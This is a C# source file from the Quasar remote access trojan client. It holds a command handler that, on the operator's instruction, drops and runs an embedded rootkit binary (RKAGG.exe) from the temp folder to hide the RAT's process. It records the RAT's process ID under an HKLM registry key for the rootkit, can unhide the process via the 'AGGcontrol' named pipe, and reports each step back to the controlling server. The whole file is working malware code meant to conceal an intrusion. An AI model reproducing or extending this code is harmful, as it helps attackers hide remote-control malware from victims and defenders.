using Microsoft.Win32;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Common.Enums;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Threading;
using Quasar.Client.User;
using System.ServiceModel;

namespace Quasar.Client.Messages
{
    public class RTActionHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoRTAction;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoRTAction msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoRTAction message)
        {
            new Thread(() =>
            {
                string a2 = message.Action;
                UserAccount acnt = new UserAccount();
                if (acnt.Type != AccountType.Admin)
                {
                    client.Send(new NotifyMessageToServer { Message = "RK: Error: must run RAT as ADMIN to hide process" });
                    return;
                }
                if (a2 == "install")
                {
                    string friendlyName = AppDomain.CurrentDomain.FriendlyName;
                    string text11 = Path.Combine(Path.GetTempPath(), "RKAGG.exe");
                    try
                    {
                        byte[] agg_Binary = Resource1.RKAGG;
                        File.WriteAllBytes(text11, agg_Binary);
                    }
                    catch (Exception)
                    {
                    }
                    try
                    {
                        Process.Start(text11);
                        if (friendlyName.StartsWith("AGG"))
                        {
                            client.Send(new NotifyMessageToServer { Message = "RK: Info: process is now hidden (method 1)" });
                        }
                        else
                        {
                            client.Send(new NotifyMessageToServer    { Message = "RK: Info: process is now hidden (method 2)" });
                        }
                    }
                    catch (Exception ex17)
                    {
                        client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: an error occurred with rk binary: {0}", ex17.Message) });
                    }
                    Thread.Sleep(15000);
                    int id = Process.GetCurrentProcess().Id;
                    try
                    {
                        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                        {
                            using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\AGGconfig\\pid", RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl))
                            {
                                if (registryKey2 != null)
                                {
                                    registryKey2.SetValue("RAT", id, RegistryValueKind.DWord);
                                }
                            }
                        }
                        return;
                    }
                    catch (UnauthorizedAccessException)
                    {
                        client.Send(new NotifyMessageToServer { Message = "RK: Error: do not have permission to write to this registry key." });
                        return;
                    }
                    catch (Exception ex18)
                    {
                        client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: an error occurred: {0}", ex18.Message) });
                        return;
                    }
                }
                if (!(a2 == "uninstall"))
                {
                    return;
                }
                using (NamedPipeClientStream namedPipeClientStream = new NamedPipeClientStream(".", "AGGcontrol", PipeDirection.InOut))
                {
                    try
                    {
                        namedPipeClientStream.Connect(1000);
                        byte[] bytes = BitConverter.GetBytes(4098);
                        namedPipeClientStream.Write(bytes, 0, bytes.Length);
                        client.Send(new NotifyMessageToServer { Message = "RK: Info: un-hide successfully" });
                        return;
                    }
                    catch (TimeoutException)
                    {
                        client.Send(new NotifyMessageToServer { Message = "RK: Warning: already un-hidden" });
                        return;
                    }
                    catch (Exception ex19)
                    {
                        client.Send(new NotifyMessageToServer { Message = string.Format("RK: Error: {0}", ex19.Message) });
                        return;
                    }
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
